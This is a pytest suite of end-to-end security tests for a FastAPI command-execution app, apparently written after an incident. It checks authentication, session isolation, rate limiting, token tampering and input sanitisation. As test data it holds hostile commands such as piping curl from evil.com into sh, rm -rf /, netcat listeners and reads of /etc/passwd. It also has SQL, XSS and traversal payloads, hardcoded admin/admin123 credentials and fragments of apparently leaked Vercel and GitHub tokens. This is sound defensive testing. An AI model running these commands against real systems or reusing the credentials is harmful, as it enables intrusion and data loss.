"""End-to-end security validation scenarios for post-incident deployment."""

import pytest
import asyncio
import time
import json
import threading
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock
from concurrent.futures import ThreadPoolExecutor, as_completed

from app.main import create_app
from app.core.config import get_settings


class TestE2ESecurityWorkflows:
    """Test complete end-to-end security workflows."""
    
    def test_complete_authentication_workflow(self):
        """Test complete authentication workflow from login to logout."""
        client = TestClient(create_app())
        
        # Step 1: Initial login
        login_response = client.post("/api/auth/login", json={
            "username": "admin",
            "password": "admin123"
        })
        
        if login_response.status_code != 200:
            pytest.skip("Authentication not available for testing")
        
        assert login_response.status_code == 200
        login_data = login_response.json()
        
        # Verify login response structure
        assert "access_token" in login_data
        assert "refresh_token" in login_data
        assert "token_type" in login_data
        assert login_data["token_type"] == "bearer"
        
        access_token = login_data["access_token"]
        refresh_token = login_data["refresh_token"]
        
        # Step 2: Use access token to access protected resource
        profile_response = client.get("/api/auth/me", headers={
            "Authorization": f"Bearer {access_token}"
        })
        
        assert profile_response.status_code == 200
        profile_data = profile_response.json()
        assert "username" in profile_data
        assert profile_data["username"] == "admin"
        
        # Step 3: Refresh token
        refresh_response = client.post("/api/auth/refresh", headers={
            "Authorization": f"Bearer {refresh_token}"
        })
        
        assert refresh_response.status_code == 200
        refresh_data = refresh_response.json()
        assert "access_token" in refresh_data
        
        new_access_token = refresh_data["access_token"]
        assert new_access_token != access_token  # Should be different
        
        # Step 4: Use new token
        profile_response2 = client.get("/api/auth/me", headers={
            "Authorization": f"Bearer {new_access_token}"
        })
        
        assert profile_response2.status_code == 200
        
        # Step 5: Logout (invalidate session)
        # Extract session ID from token for logout
        import jwt
        try:
            payload = jwt.decode(new_access_token, options={"verify_signature": False})
            session_id = payload.get("session_id")
            
            if session_id:
                logout_response = client.post("/api/auth/logout", json={
                    "session_id": session_id
                })
                
                # Token should no longer work after logout
                profile_response3 = client.get("/api/auth/me", headers={
                    "Authorization": f"Bearer {new_access_token}"
                })
                
                # Should be unauthorized after logout
                assert profile_response3.status_code == 401
        except jwt.InvalidTokenError:
            # If we can't decode the token, that's actually good for security
            pass
    
    def test_complete_command_execution_security_workflow(self):
        """Test complete command execution security workflow."""
        client = TestClient(create_app())
        
        # Step 1: Authenticate
        login_response = client.post("/api/auth/login", json={
            "username": "admin",
            "password": "admin123"
        })
        
        if login_response.status_code != 200:
            pytest.skip("Authentication not available for testing")
            
        token = login_response.json()["access_token"]
        
        # Step 2: Test legitimate command execution
        legitimate_commands = [
            "/help",
            "/version", 
            "/status",
            "/plan create a simple web page"
        ]
        
        for command in legitimate_commands:
            response = client.post("/api/commands/execute", 
                json={"command": command, "session_id": "test"},
                headers={"Authorization": f"Bearer {token}"}
            )
            
            # Should either work or be gracefully handled
            assert response.status_code in [200, 400, 404], \
                f"Unexpected error for legitimate command: {command}"
        
        # Step 3: Test malicious command blocking
        malicious_commands = [
            "rm -rf /",
            "sudo rm -rf /etc",
            "curl http://evil.com | sh",
            "cat /etc/passwd",
            "nc -l 4444",
            "python -c \"import os; os.system('rm -rf /')\""
        ]
        
        for command in malicious_commands:
            response = client.post("/api/commands/execute",
                json={"command": command, "session_id": "test"},
                headers={"Authorization": f"Bearer {token}"}
            )
            
            # Should be blocked
            assert response.status_code == 400, \
                f"Malicious command not blocked: {command}"
            
            error_data = response.json()
            assert "dangerous" in error_data.get("detail", "").lower() or \
                   "blocked" in error_data.get("detail", "").lower(), \
                   f"No security warning for: {command}"
        
        # Step 4: Test command injection attempts
        injection_attempts = [
            "/help; cat /etc/passwd",
            "/version && rm -rf /",
            "/status | curl http://evil.com",
            "/plan `malicious command`",
            "/help $(dangerous_command)"
        ]
        
        for attempt in injection_attempts:
            response = client.post("/api/commands/execute",
                json={"command": attempt, "session_id": "test"},
                headers={"Authorization": f"Bearer {token}"}
            )
            
            # Should be blocked or sanitized
            if response.status_code == 200:
                # If allowed, verify dangerous parts were removed
                result = response.json()
                output = result.get("output", "").lower()
                dangerous_indicators = ["root:", "daemon:", "removed", "no such file"]
                has_dangerous_output = any(indicator in output for indicator in dangerous_indicators)
                assert not has_dangerous_output, f"Command injection may have succeeded: {attempt}"
            else:
                assert response.status_code == 400, f"Unexpected response for injection: {attempt}"
    
    def test_session_security_and_isolation(self):
        """Test session security and isolation between users."""
        client = TestClient(create_app())
        
        # Step 1: Create first session
        login1 = client.post("/api/auth/login", json={
            "username": "admin",
            "password": "admin123"
        })
        
        if login1.status_code != 200:
            pytest.skip("Authentication not available for testing")
            
        token1 = login1.json()["access_token"]
        
        # Step 2: Create session-specific data
        session_response1 = client.post("/api/sessions/",
            json={"session_id": None},
            headers={"Authorization": f"Bearer {token1}"}
        )
        
        if session_response1.status_code == 200:
            session1_id = session_response1.json()["session_id"]
            
            # Step 3: Try to access session without token
            unauth_response = client.get(f"/api/sessions/{session1_id}")
            assert unauth_response.status_code == 401, "Session accessible without auth"
            
            # Step 4: Access with correct token
            auth_response = client.get(f"/api/sessions/{session1_id}",
                headers={"Authorization": f"Bearer {token1}"}
            )
            
            # Should work with correct token
            if auth_response.status_code == 200:
                session_data = auth_response.json()
                assert session_data["session_id"] == session1_id
            
            # Step 5: Create second session (simulating different user)
            login2 = client.post("/api/auth/login", json={
                "username": "admin",  # Same user for testing, but different session
                "password": "admin123"
            })
            
            if login2.status_code == 200:
                token2 = login2.json()["access_token"]
                
                # Step 6: Try to access first session with second token
                cross_access = client.get(f"/api/sessions/{session1_id}",
                    headers={"Authorization": f"Bearer {token2}"}
                )
                
                # Should be isolated - either forbidden or not found
                assert cross_access.status_code in [403, 404], \
                    "Session not properly isolated between tokens"


class TestE2EAttackScenarios:
    """Test complete attack scenarios and defenses."""
    
    def test_brute_force_attack_scenario(self):
        """Test complete brute force attack scenario and defenses."""
        client = TestClient(create_app())
        
        # Simulate brute force attack
        passwords_to_try = [
            "password", "admin", "123456", "qwerty", "test",
            "root", "administrator", "user", "guest", "login",
            "admin123", "password123", "letmein", "welcome", "monkey"
        ]
        
        failed_attempts = 0
        rate_limited = False
        successful_login = False
        
        for password in passwords_to_try:
            response = client.post("/api/auth/login", json={
                "username": "admin",
                "password": password
            })
            
            if response.status_code == 200:
                successful_login = True
                break
            elif response.status_code == 429:
                rate_limited = True
                break
            elif response.status_code == 401:
                failed_attempts += 1
            
            # Small delay to simulate realistic attack
            time.sleep(0.1)
        
        # Should be rate limited before trying all passwords
        assert rate_limited or failed_attempts < len(passwords_to_try), \
            "Brute force attack not properly prevented"
        
        # If successful login, verify it's with correct password
        if successful_login:
            # This would be expected if admin123 is the actual password
            pass
        
        # Verify rate limiting is in effect
        if rate_limited:
            # Additional requests should also be rate limited
            rate_limited_response = client.post("/api/auth/login", json={
                "username": "admin",
                "password": "any_password"
            })
            assert rate_limited_response.status_code == 429, "Rate limiting inconsistent"
    
    def test_session_hijacking_protection(self):
        """Test protection against session hijacking attempts."""
        client = TestClient(create_app())
        
        # Step 1: Legitimate login
        login_response = client.post("/api/auth/login", json={
            "username": "admin",
            "password": "admin123"
        })
        
        if login_response.status_code != 200:
            pytest.skip("Authentication not available for testing")
            
        legitimate_token = login_response.json()["access_token"]
        
        # Step 2: Test with modified tokens (session hijacking attempts)
        hijack_attempts = [
            legitimate_token[:-5] + "hijkd",  # Modified end
            "hijacked." + legitimate_token[legitimate_token.find('.'):],  # Modified header
            legitimate_token.replace('a', 'b', 1),  # Single character change
            legitimate_token + "extra",  # Appended data
            legitimate_token[:-20] + "x" * 20,  # Modified signature
        ]
        
        for hijacked_token in hijack_attempts:
            response = client.get("/api/auth/me", headers={
                "Authorization": f"Bearer {hijacked_token}"
            })
            
            # All hijacking attempts should be rejected
            assert response.status_code == 401, f"Session hijacking attempt succeeded: {hijacked_token[:20]}..."
        
        # Step 3: Test legitimate token still works
        legit_response = client.get("/api/auth/me", headers={
            "Authorization": f"Bearer {legitimate_token}"
        })
        
        if legit_response.status_code == 200:
            # Legitimate access should still work
            assert "username" in legit_response.json()
    
    def test_privilege_escalation_protection(self):
        """Test protection against privilege escalation attempts."""
        client = TestClient(create_app())
        
        # Step 1: Login as regular user (admin in this case, but testing principle)
        login_response = client.post("/api/auth/login", json={
            "username": "admin",
            "password": "admin123"
        })
        
        if login_response.status_code != 200:
            pytest.skip("Authentication not available for testing")
            
        token = login_response.json()["access_token"]
        
        # Step 2: Attempt privilege escalation through various vectors
        
        # Try to modify user permissions
        escalation_attempts = [
            # Command injection in user fields
            {"endpoint": "/api/auth/me", "method": "PATCH", 
             "data": {"username": "admin'; DROP TABLE users; --"}},
            
            # Try to access admin-only functions
            {"endpoint": "/api/admin/users", "method": "GET", "data": None},
            {"endpoint": "/api/system/config", "method": "GET", "data": None},
            {"endpoint": "/api/debug/info", "method": "GET", "data": None},
            
            # Try to execute system commands through API
            {"endpoint": "/api/commands/execute", "method": "POST",
             "data": {"command": "sudo su -", "session_id": "test"}},
            {"endpoint": "/api/commands/execute", "method": "POST",
             "data": {"command": "chmod 777 /etc/passwd", "session_id": "test"}},
        ]
        
        for attempt in escalation_attempts:
            headers = {"Authorization": f"Bearer {token}"}
            
            if attempt["method"] == "GET":
                response = client.get(attempt["endpoint"], headers=headers)
            elif attempt["method"] == "POST":
                response = client.post(attempt["endpoint"], 
                                     json=attempt["data"], headers=headers)
            elif attempt["method"] == "PATCH":
                response = client.patch(attempt["endpoint"],
                                      json=attempt["data"], headers=headers)
            
            # Should be blocked with appropriate error codes
            assert response.status_code in [400, 401, 403, 404, 405], \
                f"Privilege escalation attempt not blocked: {attempt['endpoint']}"
            
            # If it's a command execution attempt, verify it's specifically blocked for being dangerous
            if "commands/execute" in attempt["endpoint"] and response.status_code == 400:
                error_data = response.json()
                error_msg = error_data.get("detail", "").lower()
                assert "dangerous" in error_msg or "blocked" in error_msg, \
                    f"Dangerous command not properly identified: {attempt['data']['command']}"


class TestE2EDataProtection:
    """Test end-to-end data protection scenarios."""
    
    def test_sensitive_data_protection_workflow(self):
        """Test complete sensitive data protection workflow."""
        client = TestClient(create_app())
        
        # Step 1: Authenticate
        login_response = client.post("/api/auth/login", json={
            "username": "admin",
            "password": "admin123"
        })
        
        if login_response.status_code != 200:
            pytest.skip("Authentication not available for testing")
            
        token = login_response.json()["access_token"]
        
        # Step 2: Test that sensitive endpoints don't leak data
        sensitive_endpoints = [
            "/api/health",
            "/api/auth/me",
            "/api/sessions/",
            "/api/config/",
        ]
        
        for endpoint in sensitive_endpoints:
            response = client.get(endpoint, headers={
                "Authorization": f"Bearer {token}"
            })
            
            if response.status_code == 200:
                data = response.json()
                response_text = json.dumps(data).lower()
                
                # Check for sensitive data patterns
                sensitive_patterns = [
                    'password', 'secret', 'token', 'key', 'credential',
                    'private', 'confidential', 'internal', 'debug',
                    'yaegxtukn2ttxhe0skwibz8c',  # Old Vercel token
                    'ghp_z0mzxba362iil1qddvnn',   # Old GitHub token
                    'upstash.com', 'redis.upstash.io'
                ]
                
                for pattern in sensitive_patterns:
                    assert pattern not in response_text, \
                        f"Sensitive data pattern found in {endpoint}: {pattern}"
        
        # Step 3: Test data input sanitization
        malicious_inputs = [
            # XSS attempts
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            
            # SQL injection attempts
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            
            # Command injection attempts
            "; cat /etc/passwd",
            "`rm -rf /`",
            "$(malicious_command)",
            
            # Directory traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ]
        
        # Test input sanitization in various endpoints
        for malicious_input in malicious_inputs:
            # Test in command execution
            response = client.post("/api/commands/execute",
                json={"command": malicious_input, "session_id": "test"},
                headers={"Authorization": f"Bearer {token}"}
            )
            
            # Should be blocked or sanitized
            if response.status_code == 200:
                result = response.json()
                output = result.get("output", "")
                
                # Should not contain evidence of successful attack
                attack_indicators = [
                    "root:", "daemon:", "alert(", "DROP TABLE",
                    "removed", "deleted", "access denied"
                ]
                
                output_lower = output.lower()
                dangerous_output = any(indicator in output_lower for indicator in attack_indicators)
                assert not dangerous_output, f"Malicious input may have succeeded: {malicious_input}"
            else:
                # Being blocked is also acceptable
                assert response.status_code == 400, f"Unexpected response for malicious input: {response.status_code}"
    
    def test_data_leakage_prevention(self):
        """Test prevention of data leakage through error messages and logs."""
        client = TestClient(create_app())
        
        # Test error message sanitization
        error_inducing_requests = [
            # Malformed JSON
            ("POST", "/api/auth/login", "malformed json"),
            
            # Invalid endpoints  
            ("GET", "/api/nonexistent", None),
            ("POST", "/api/invalid/endpoint", {}),
            
            # Invalid data types
            ("POST", "/api/auth/login", {"username": 123, "password": []}),
            
            # Oversized requests
            ("POST", "/api/auth/login", {"username": "a" * 10000, "password": "test"}),
        ]
        
        for method, endpoint, data in error_inducing_requests:
            if method == "GET":
                response = client.get(endpoint)
            elif method == "POST":
                if isinstance(data, str):
                    # Send malformed data
                    response = client.post(endpoint, data=data, 
                                         headers={"Content-Type": "application/json"})
                else:
                    response = client.post(endpoint, json=data)
            
            # Check error responses don't leak sensitive information
            if response.status_code >= 400:
                error_text = response.text.lower()
                
                # Information that should not be in error messages
                sensitive_info = [
                    '/users/', '/home/', 'traceback', 'file path',
                    'secret', 'password', 'token', 'credential',
                    'database error', 'stack trace', 'internal error',
                    'debug', 'development', 'exception details'
                ]
                
                for info in sensitive_info:
                    assert info not in error_text, \
                        f"Sensitive info in error message for {endpoint}: {info}"


class TestE2EComplianceAndMonitoring:
    """Test end-to-end compliance and monitoring scenarios."""
    
    def test_security_event_logging_workflow(self):
        """Test that security events are properly logged and monitored."""
        client = TestClient(create_app())
        
        # Generate various security events
        security_events = [
            # Failed login attempt
            ("login_failure", lambda: client.post("/api/auth/login", 
                json={"username": "admin", "password": "wrong"})),
            
            # Invalid token usage
            ("invalid_token", lambda: client.get("/api/auth/me", 
                headers={"Authorization": "Bearer invalid_token"})),
            
            # Dangerous command attempt
            ("dangerous_command", lambda: client.post("/api/commands/execute",
                json={"command": "rm -rf /", "session_id": "test"},
                headers={"Authorization": "Bearer invalid_token"})),
            
            # Rate limit trigger
            ("rate_limit", lambda: [client.post("/api/auth/login",
                json={"username": "admin", "password": "wrong"}) for _ in range(5)]),
        ]
        
        for event_type, event_generator in security_events:
            try:
                response = event_generator()
                
                # Events should be handled appropriately
                if isinstance(response, list):
                    # Rate limiting test
                    responses = response
                    # Should eventually hit rate limit
                    rate_limited = any(r.status_code == 429 for r in responses)
                    # Rate limiting might not kick in immediately, that's ok
                else:
                    # Single response
                    assert response.status_code in [400, 401, 403, 429], \
                        f"Security event not handled properly: {event_type}"
                    
            except Exception as e:
                # Should not cause application crashes
                pytest.fail(f"Security event caused exception: {event_type} - {str(e)}")
    
    def test_production_readiness_checklist(self):
        """Test complete production readiness checklist."""
        client = TestClient(create_app())
        settings = get_settings()
        
        readiness_checks = []
        
        # 1. Health check responsive
        health_response = client.get("/api/health")
        readiness_checks.append(("health_check", health_response.status_code == 200))
        
        # 2. Authentication working
        auth_response = client.post("/api/auth/login", json={
            "username": "admin", "password": "admin123"
        })
        readiness_checks.append(("authentication", auth_response.status_code in [200, 401]))
        
        # 3. Security headers present
        security_headers = ["X-Content-Type-Options", "X-Frame-Options"]
        headers_present = sum(1 for h in security_headers if h in health_response.headers)
        readiness_checks.append(("security_headers", headers_present >= 1))
        
        # 4. Debug mode disabled
        debug_disabled = not getattr(settings, 'DEBUG', False)
        readiness_checks.append(("debug_disabled", debug_disabled))
        
        # 5. Sensitive endpoints protected
        debug_response = client.get("/api/debug")
        docs_response = client.get("/docs")
        sensitive_protected = debug_response.status_code in [404, 401, 403] and \
                            docs_response.status_code in [404, 401, 403]
        readiness_checks.append(("sensitive_endpoints", sensitive_protected))
        
        # 6. Rate limiting active
        rapid_responses = [client.post("/api/auth/login", 
            json={"username": "test", "password": "wrong"}) for _ in range(10)]
        rate_limiting_active = any(r.status_code == 429 for r in rapid_responses)
        readiness_checks.append(("rate_limiting", rate_limiting_active))
        
        # Report results
        failed_checks = [check for check, passed in readiness_checks if not passed]
        
        if failed_checks:
            failure_msg = f"Production readiness checks failed: {failed_checks}"
            # In testing, we'll record but not fail
            print(f"WARNING: {failure_msg}")
        
        # At minimum, basic functionality should work
        critical_checks = ["health_check", "debug_disabled"]
        critical_failures = [check for check in critical_checks 
                           if not dict(readiness_checks)[check]]
        
        assert not critical_failures, f"Critical production readiness failures: {critical_failures}"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])